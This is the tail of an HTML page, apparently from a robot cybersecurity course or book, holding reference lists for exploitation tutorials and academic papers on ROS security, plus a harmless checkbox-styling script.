    - [7] Standford. *64-bit Linux Return-Oriented Programming*. Retrieved from https://crypto.stanford.edu/~blynn/rop/
    - [8] slimm609. *checksec.sh*. Retrieved from https://github.com/slimm609/checksec.sh
    - [9] Ketan Singh (2017), *Introduction to Return Oriented Programming (ROP)*. Retreived from https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/.
    - [10] Stack Overflow. *Managing inputs for payload injection?*. Retrieved from https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa.
    - [11] Long Le. *Python Exploit Development Assistance for GDB (PEDA)*. Retreived from https://github.com/longld/peda.
    - [12] Axel Souchet. *rp++*. Retrieved from https://github.com/0vercl0k/rp.

    ### Tutorial 6
    - [1] 0x00pf (2016), *Remote Shells. Part I*. Retrieved from https://0x00sec.org/t/remote-shells-part-i/269.
    - [2] picoFlamingo, *0x00sec_code*, Github. Retrieved from https://github.com/0x00pf/0x00sec_code/tree/master/remote_shell.
    - [3] 0x00pf (2016), *Remote Shells Part IV. The Invisible Remote Shell*. Retrieved from  https://0x00sec.org/t/remote-shells-part-iv-the-invisible-remote-shell/743
    - [4] 0x00pf (2016), *Remote Shells. Part II. Crypt your link*. Retrieved from https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.

    ### Tutorial 7
    - [1] Gallopsled, *pwntools*. Retrieved from https://github.com/Gallopsled/pwntools.
    - [2] Gallopsled, *pwntools Docs*. Retrieved from https://docs.pwntools.com/en/stable/index.html.
    - [3] Exploit Database. Retrieved from https://www.exploit-db.com/.
    - [4] University Politehnica of Bucharest, Computer Science and Engineering Department, Computer and Network Security. *Lab 07 - Exploiting. Shellcodes (Part 2)*. Retrieved from https://ocw.cs.pub.ro/courses/cns/labs/lab-07.
    - [5] nnamon. *linux-exploitation-course*. Retrieved from https://github.com/nnamon/linux-exploitation-course.
    - [6] nnamon. *linux-exploitation-course 2*. Retrieved from https://github.com/nnamon/linux-exploitation-course-2.
    - [7] Eadom. *Pwntools Quick Reference Guide*. Retrieved from https://blog.eadom.net/uncategorized/pwntools-quick-reference-guide/.
    - [8] University Politehnica of Bucharest, Computer Science and Engineering Department, Computer and Network Security. *Lab 06 - Exploiting. Shellcodes*. Retrieved from https://ocw.cs.pub.ro/courses/cns/labs/lab-06#phase_1recon.

    ### Tutorial 8
    - [1] Linux exploitation course. Retrieved from https://github.com/nnamon/linux-exploitation-course.
    - [2] `pwn-school`. Retrieved from https://github.com/Arusekk/pwn-school

    ### Tutorial 9
    - [1] pwnbox. Retrieved from https://github.com/superkojiman/pwnbox.
    - [2] pwntools-docker. Retrieved from https://github.com/RobertLarsen/pwntools-docker.

    -->
    <div id="refs" class="references csl-bib-body hanging-indent" role="doc-bibliography">
    <div id="ref-kirschgens2018robot" class="csl-entry" role="doc-biblioentry">
    Alzola-Kirschgens, Laura, Irati Zamalloa Ugarte, Endika Gil Uriarte, Aday Muniz Rosas, and Vı́ctor Mayoral Vilches. 2018. <span>“Robot Hazards: From Safety to Security.”</span> <em>arXiv Preprint arXiv:1806.06681</em>.
    </div>
    <div id="ref-balsa2017cybersecurity" class="csl-entry" role="doc-biblioentry">
    Balsa-Comerón, Jesús, Ángel Manuel Guerrero-Higueras, Francisco Javier Rodrı́guez-Lera, Camino Fernández-Llamas, and Vicente Matellán-Olivera. 2017. <span>“Cybersecurity in Autonomous Systems: Hardening ROS Using Encrypted Communications and Semantic Rules.”</span> In <em>Iberian Robotics Conference</em>, 67–78. Springer.
    </div>
    <div id="ref-bozic2017planning" class="csl-entry" role="doc-biblioentry">
    Bozic, Josip, and Franz Wotawa. 2017. <span>“Planning the Attack! Or How to Use Ai in Security Testing?”</span> In <em>IWAISe: First International Workshop on Artificial Intelligence in Security</em>. Vol. 50.
    </div>
    <div id="ref-SecurecomROS" class="csl-entry" role="doc-biblioentry">
    Breiling, B., B. Dieber, and P. Schartner. 2017. <span>“Secure Communication for the Robot Operating System.”</span> In <em>2017 Annual IEEE International Systems Conference (SysCon)</em>, 1–6. <a href="https://doi.org/10.1109/SYSCON.2017.7934755">https://doi.org/10.1109/SYSCON.2017.7934755</a>.
    </div>
    <div id="ref-caiazza2017security" class="csl-entry" role="doc-biblioentry">
    Caiazza, Gianluca. 2017. <span>“Security Enhancements of Robot Operating Systems.”</span> {B.S.} thesis, Universit<span>à</span> Ca’Foscari Venezia.
    </div>
    <div id="ref-caiazza2019enhancing" class="csl-entry" role="doc-biblioentry">
    Caiazza, Gianluca, Ruffin White, and Agostino Cortesi. 2019. <span>“Enhancing Security in ROS.”</span> In <em>Advanced Computing and Systems for Security</em>, 3–15. Springer.
    </div>
    <div id="ref-dieber2019security" class="csl-entry" role="doc-biblioentry">
    Dieber, Bernhard, and Benjamin Breiling. 2019. <span>“Security Considerations in Modular Mobile Manipulation.”</span> In <em>2019 Third IEEE International Conference on Robotic Computing (IRC)</em>, 70–77. IEEE.
    </div>
    <div id="ref-Dieber:2017:SRO:3165321.3165569" class="csl-entry" role="doc-biblioentry">
    Dieber, Bernhard, Benjamin Breiling, Sebastian Taurer, Severin Kacianka, Stefan Rass, and Peter Schartner. 2017. <span>“Security for the Robot Operating System.”</span> <em>Robot. Auton. Syst.</em> 98 (C): 192–203. <a href="https://doi.org/10.1016/j.robot.2017.09.017">https://doi.org/10.1016/j.robot.2017.09.017</a>.
    </div>
    <div id="ref-dieber2016application" class="csl-entry" role="doc-biblioentry">
    Dieber, Bernhard, Severin Kacianka, Stefan Rass, and Peter Schartner. 2016. <span>“Application-Level Security for ROS-Based Applications.”</span> In <em>2016 IEEE/RSJ International Conference on Intelligent Robots and Systems (IROS)</em>, 4477–82. IEEE.
    </div>
    <div id="ref-dieber2017safety" class="csl-entry" role="doc-biblioentry">
    Dieber, Bernhard, Andreas Schlotzhauer, and Mathias Brandstötter. 2017. <span>“Safety &amp; Security–Erfolgsfaktoren von Sensitiven Robotertechnologien.”</span> <em>E &amp; i Elektrotechnik Und Informationstechnik</em> 134 (6): 299–303.
    </div>
    <div id="ref-dieber2020penetration" class="csl-entry" role="doc-biblioentry">
    Dieber, Bernhard, Ruffin White, Sebastian Taurer, Benjamin Breiling, Gianluca Caiazza, Henrik Christensen, and Agostino Cortesi. 2020. <span>“Penetration Testing ROS.”</span> In <em>Robot Operating System (ROS)</em>, 183–225. Springer.
    </div>
    <div id="ref-guerrero2017empirical" class="csl-entry" role="doc-biblioentry">
    Guerrero-Higueras, Ángel Manuel, Noemı́ DeCastro-Garcı́a, Francisco Javier Rodrı́guez-Lera, and Vicente Matellán. 2017. <span>“Empirical Analysis of Cyber-Attacks to an Indoor Real Time Localization System for Autonomous Robots.”</span> <em>Computers &amp; Security</em> 70: 422–35.
    </div>
    <div id="ref-lacava2020current" class="csl-entry" role="doc-biblioentry">
    Lacava, G, A Marotta, F Martinelli, A Saracino, A La Marra, E Gil-Uriarte, and V Mayoral-Vilches. 2020. <span>“Current Research Issues on Cyber Security in Robotics.”</span>
    </div>
    <div id="ref-lera2017cybersecurity" class="csl-entry" role="doc-biblioentry">
    Lera, Francisco J Rodrı́guez, Camino Fernández Llamas, Ángel Manuel Guerrero, and Vicente Matellán Olivera. 2017. <span>“Cybersecurity of Robotics and Autonomous Systems: Privacy and Safety.”</span> <em>Robotics-Legal, Ethical and Socioeconomic Impacts</em>.
    </div>
    <div id="ref-lera2016cybersecurity" class="csl-entry" role="doc-biblioentry">
    Lera, Francisco Javier Rodrıguez, Jesús Balsa, Fernando Casado, Camino Fernández, Francisco Martın Rico, and Vicente Matellán. 2016. <span>“Cybersecurity in Autonomous Systems: Evaluating the Performance of Hardening ROS.”</span> <em>M<span>á</span>laga, Spain</em> 47.
    </div>
    <div id="ref-lera2016ciberseguridad" class="csl-entry" role="doc-biblioentry">
    Lera, Francisco Javier Rodrıguez, Vicente Matellán, Jesús Balsa, and Fernando Casado. 2016. <span>“Ciberseguridad En Robots Aut<span>ó</span>nomos: An<span>á</span>lisis y Evaluaci<span>ó</span>n Multiplataforma Del Bastionado ROS.”</span> <em>Actas Jornadas Sarteco</em>, 571–78.
    </div>
    <div id="ref-mayoral2018towardsRVSS" class="csl-entry" role="doc-biblioentry">
    Mayoral Vilches, Vı́ctor, Endika Gil-Uriarte, Irati Zamalloa Ugarte, Gorka Olalde Mendia, Rodrigo Izquierdo Pisón, Laura Alzola Kirschgens, Asier Bilbao Calvo, Alejandro Hernández Cordero, Lucas Apa, and César Cerrudo. 2018. <span>“Towards an Open Standard for Assessing the Severity of Robot Security Vulnerabilities, the Robot Vulnerability Scoring System (RVSS).”</span> <em>arXiv Preprint arXiv:1807.10357</em>.
    </div>
    <div id="ref-mayoral2021hacking" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Victor, Alfonso Glera-Picón, Unai Ayúcar-Carbajo, Stefan Rass, Martin Pinzger, Federico Maggi, and Endika Gil-Uriarte. 2021. <span>“Hacking Planned Obsolescense in Robotics, Towards Security-Oriented Robot Teardown.”</span> <em>Electronic Communications of the EASST</em> 80.
    </div>
    <div id="ref-mayoral2020alurity" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Irati Abad-Fernández, Martin Pinzger, Stefan Rass, Bernhard Dieber, Alcino Cunha, Francisco J Rodrı́guez-Lera, et al. 2020. <span>“Alurity, a Toolbox for Robot Cybersecurity.”</span> <em>arXiv Preprint arXiv:2010.07759</em>.
    </div>
    <div id="ref-mayoral2020industrial" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Unai Ayucar Carbajo, and Endika Gil-Uriarte. 2020. <span>“Industrial Robot Ransomware: Akerbeltz.”</span> In <em>2020 Fourth IEEE International Conference on Robotic Computing (IRC)</em>, 432–35. IEEE.
    </div>
    <div id="ref-mayoral2020devsecops" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Nuria Garcı́a-Maestro, McKenna Towers, and Endika Gil-Uriarte. 2020. <span>“DevSecOps in Robotics.”</span> <em>arXiv Preprint arXiv:2003.10402</em>.
    </div>
    <div id="ref-vilches2018introducing" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Laura Alzola Kirschgens, Asier Bilbao Calvo, Alejandro Hernández Cordero, Rodrigo Izquierdo Pisón, David Mayoral Vilches, Aday Muñiz Rosas, et al. 2018. <span>“Introducing the Robot Security Framework (Rsf), a Standardized Methodology to Perform Security Assessments in Robotics.”</span> <em>arXiv Preprint arXiv:1806.04042</em>.
    </div>
    <div id="ref-vilches2018volatile" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Laura Alzola Kirschgens, Endika Gil-Uriarte, Alejandro Hernández, and Bernhard Dieber. 2018. <span>“Volatile Memory Forensics for the Robot Operating System.”</span> <em>arXiv Preprint arXiv:1812.09492</em>.
    </div>
    <div id="ref-mayoral2018aztarna" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Gorka Olalde Mendia, Xabier Perez Baskaran, Alejandro Hernández Cordero, Lander Usategui San Juan, Endika Gil-Uriarte, Odei Olalde Saez de Urabain, and Laura Alzola Kirschgens. 2018. <span>“Aztarna, a Footprinting Tool for Robots.”</span> <em>arXiv Preprint arXiv:1812.09490</em>.
    </div>
    <div id="ref-mayoral2020can" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Martin Pinzger, Stefan Rass, Bernhard Dieber, and Endika Gil-Uriarte. 2020. <span>“Can ROS Be Used Securely in Industry? Red Teaming ROS-Industrial.”</span> <em>arXiv Preprint arXiv:2009.08211</em>.
    </div>
    <div id="ref-mayoral2019industrial" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Lander Usategui San Juan, Unai Ayucar Carbajo, Rubén Campo, Xabier Sáez de Cámara, Oxel Urzelai, Nuria Garcı́a, and Endika Gil-Uriarte. 2019. <span>“Industrial Robot Ransomware: Akerbeltz.”</span> <em>arXiv Preprint arXiv:1912.07714</em>.
    </div>
    <div id="ref-mayoral2019introducing" class="csl-entry" role="doc-biblioentry">
    Mayoral-Vilches, Vı́ctor, Lander Usategui San Juan, Bernhard Dieber, Unai Ayucar Carbajo, and Endika Gil-Uriarte. 2019. <span>“Introducing the Robot Vulnerability Database (RVD).”</span> <em>arXiv e-Prints</em>, arXiv–1912.
    </div>
    <div id="ref-mcclean2013preliminary" class="csl-entry" role="doc-biblioentry">
    McClean, Jarrod, Christopher Stull, Charles Farrar, and David Mascareñas. 2013. <span>“A Preliminary Cyber-Physical Security Assessment of the Robot Operating System (Ros).”</span> In <em>Unmanned Systems Technology XV</em>, 8741:874110. International Society for Optics; Photonics.
    </div>
    <div id="ref-mendia2018robotics" class="csl-entry" role="doc-biblioentry">
    Mendia, Gorka Olalde, Lander Usategui San Juan, Xabier Perez Bascaran, Asier Bilbao Calvo, Alejandro Hernández Cordero, Irati Zamalloa Ugarte, Aday Muñiz Rosas, et al. 2018. <span>“Robotics CTF (RCTF), a Playground for Robot Hacking.”</span> <em>arXiv Preprint arXiv:1810.02690</em>.
    </div>
    <div id="ref-quigley2009ros" class="csl-entry" role="doc-biblioentry">
    Quigley, Morgan, Ken Conley, Brian Gerkey, Josh Faust, Tully Foote, Jeremy Leibs, Rob Wheeler, and Andrew Y Ng. 2009. <span>“ROS: An Open-Source Robot Operating System.”</span> In <em>ICRA Workshop on Open Source Software</em>, 3:5. 3.2. Kobe, Japan.
    </div>
    <div id="ref-Quigley09" class="csl-entry" role="doc-biblioentry">
    Quigley, Morgan, Brian Gerkey, Ken Conley, Josh Faust, Tully Foote, Jeremy Leibs, Eric Berger, Rob Wheeler, and Andrew Ng. 2009. <span>“ROS: An Open-Source Robot Operating System.”</span> In <em>Proc. Of the IEEE Intl. Conf. On Robotics and Automation (ICRA) Workshop on Open Source Robotics</em>. Kobe, Japan.
    </div>
    <div id="ref-historyofrobotics" class="csl-entry" role="doc-biblioentry">
    Robinson, Adam. 2014. <span>“The History of Robotics in Manufacturing.”</span> <em>Cerasis</em>. <a href="http://cerasis.com/2014/10/06/robotics-in-manufacturing/" class="uri">http://cerasis.com/2014/10/06/robotics-in-manufacturing/</a>.
    </div>
    <div id="ref-rodriguez2018message" class="csl-entry" role="doc-biblioentry">
    Rodrı́guez-Lera, Francisco J, Vicente Matellán-Olivera, Jesús Balsa-Comerón, Ángel Manuel Guerrero-Higueras, and Camino Fernández-Llamas. 2018. <span>“Message Encryption in Robot Operating System: Collateral Effects of Hardening Mobile Robots.”</span> <em>Frontiers in ICT</em> 5: 2.
    </div>
    <div id="ref-1673343" class="csl-entry" role="doc-biblioentry">
    Stoneburner, G. 2006. <span>“Toward a Unified Security-Safety Model.”</span> <em>Computer</em> 39 (8): 96–97. <a href="https://doi.org/10.1109/MC.2006.283">https://doi.org/10.1109/MC.2006.283</a>.
    </div>
    <div id="ref-safetysecurity" class="csl-entry" role="doc-biblioentry">
    Swinscow-Hall, Duncan. 2017. <span>“The Interaction Between Safety and Security.”</span> <a href="https://wwwf.imperial.ac.uk/blog/security-institute/2017/01/03/the-relationship-between-safety-and-security/" class="uri">https://wwwf.imperial.ac.uk/blog/security-institute/2017/01/03/the-relationship-between-safety-and-security/</a>.
    </div>
    <div id="ref-taurer2018secure" class="csl-entry" role="doc-biblioentry">
    Taurer, Sebastian, Bernhard Dieber, and Peter Schartner. 2018. <span>“Secure Data Recording and Bio-Inspired Functional Integrity for Intelligent Robots.”</span> In <em>2018 IEEE/RSJ International Conference on Intelligent Robots and Systems (IROS)</em>, 8723–28. IEEE.
    </div>
    <div id="ref-vilches2018towards" class="csl-entry" role="doc-biblioentry">
    Vilches, Vı́ctor Mayoral, Endika Gil-Uriarte, Irati Zamalloa Ugarte, Gorka Olalde Mendia, Rodrigo Izquierdo Pisón, Laura Alzola-Kirschgens, Asier Bilbao Calvo, Alejandro Hernández Cordero, Lucas Apa, and César Cerrudo. 2018. <span>“Towards an Open Standard for Assessing the Severity of Robot Security Vulnerabilities, the Robot Vulnerability Scoring System (RVSS).”</span> <em>arXiv Preprint arXiv:1807.10357</em>.
    </div>
    <div id="ref-vilches2019introducing" class="csl-entry" role="doc-biblioentry">
    Vilches, Vı́ctor Mayoral, Lander Usategui San Juan, Bernhard Dieber, Unai Ayucar Carbajo, and Endika Gil-Uriarte. 2019. <span>“Introducing the Robot Vulnerability Database (Rvd).”</span> <em>arXiv Preprint arXiv:1912.11299</em>.
    </div>
    <div id="ref-vilches2018aztarna" class="csl-entry" role="doc-biblioentry">
    Vilches, Vı́ctor Mayoral, Gorka Olalde Mendia, Xabier Perez Baskaran, Alejandro Hernández Cordero, Lander Usategui San Juan, Endika Gil-Uriarte, Odei Olalde Saez de Urabain, and Laura Alzola-Kirschgens. 2018. <span>“Aztarna, a Footprinting Tool for Robots.”</span> <em>arXiv Preprint arXiv:1812.09490</em>.
    </div>
    <div id="ref-white2019sros1" class="csl-entry" role="doc-biblioentry">
    White, Ruffin, Gianluca Caiazza, Henrik Christensen, and Agostino Cortesi. 2019. <span>“Sros1: Using and Developing Secure Ros1 Systems.”</span> In <em>Robot Operating System (ROS)</em>, 373–405. Springer.
    </div>
    <div id="ref-white2019black" class="csl-entry" role="doc-biblioentry">
    White, Ruffin, Gianluca Caiazza, Agostino Cortesi, Young Im Cho, and Henrik I Christensen. 2019. <span>“Black Block Recorder: Immutable Black Box Logging for Robots via Blockchain.”</span> <em>IEEE Robotics and Automation Letters</em> 4 (4): 3812–19.
    </div>
    <div id="ref-white2019network" class="csl-entry" role="doc-biblioentry">
    White, Ruffin, Gianluca Caiazza, Chenxu Jiang, Xinyue Ou, Zhiyue Yang, Agostino Cortesi, and Henrik Christensen. 2019. <span>“Network Reconnaissance and Vulnerability Excavation of Secure DDS Systems.”</span> In <em>2019 IEEE European Symposium on Security and Privacy Workshops (EuroS&amp;PW)</em>, 57–66. IEEE.
    </div>
    <div id="ref-white2016sros" class="csl-entry" role="doc-biblioentry">
    White, Ruffin, Dr Christensen, I Henrik, Dr Quigley, et al. 2016. <span>“SROS: Securing ROS over the Wire, in the Graph, and Through the Kernel.”</span> <em>arXiv Preprint arXiv:1611.07060</em>.
    </div>
    <div id="ref-white2018procedurally" class="csl-entry" role="doc-biblioentry">
    White, Ruffin, Henrik I Christensen, Gianluca Caiazza, and Agostino Cortesi. 2018. <span>“Procedurally Provisioned Access Control for Robotic Systems.”</span> In <em>2018 IEEE/RSJ International Conference on Intelligent Robots and Systems (IROS)</em>, 1–9. IEEE.
    </div>
    <div id="ref-firstkiller" class="csl-entry" role="doc-biblioentry">
    Young, Bryan. 2018. <span>“The First ’Killer Robot’ Was Around Back in 1979.”</span> <a href="https://science.howstuffworks.com/first-killer-robot-was-around-back-in-1979.htm" class="uri">https://science.howstuffworks.com/first-killer-robot-was-around-back-in-1979.htm</a>.
    </div>
    <div id="ref-zhu2021cybersecurity" class="csl-entry" role="doc-biblioentry">
    Zhu, Quanyan, Stefan Rass, Bernhard Dieber, and Victor Mayoral Vilches. 2021a. <span>“An Introduction to Robot System Cybersecurity.”</span> <em>arXiv Preprint arXiv:2103.05789</em>.
    </div>
    <div id="ref-ROB-061" class="csl-entry" role="doc-biblioentry">
    Zhu, Quanyan, Stefan Rass, Bernhard Dieber, and Víctor Mayoral Vilches. 2021b. <span>“Cybersecurity in Robotics: Challenges, Quantitative Modeling, and Practice.”</span> <em>Foundations and Trends® in Robotics</em> 9 (1): 1–129. <a href="https://doi.org/10.1561/2300000061">https://doi.org/10.1561/2300000061</a>.
    </div>
    </div>
  </main>

    <script>
    ;
    (function() {
      // Non-essential if user has JavaScript off. Just makes checkboxes look nicer.
      var selector = '.task-list > li > input[type="checkbox"]';
      var checkboxes = document.querySelectorAll(selector);
      Array.from(checkboxes).forEach((checkbox) => {
        var wasChecked = checkbox.checked;
        checkbox.disabled = false;
        checkbox.addEventListener('click', (ev) => {
          ev.target.checked = wasChecked
        });
      });
    })();
  </script>
  </body>

</html>
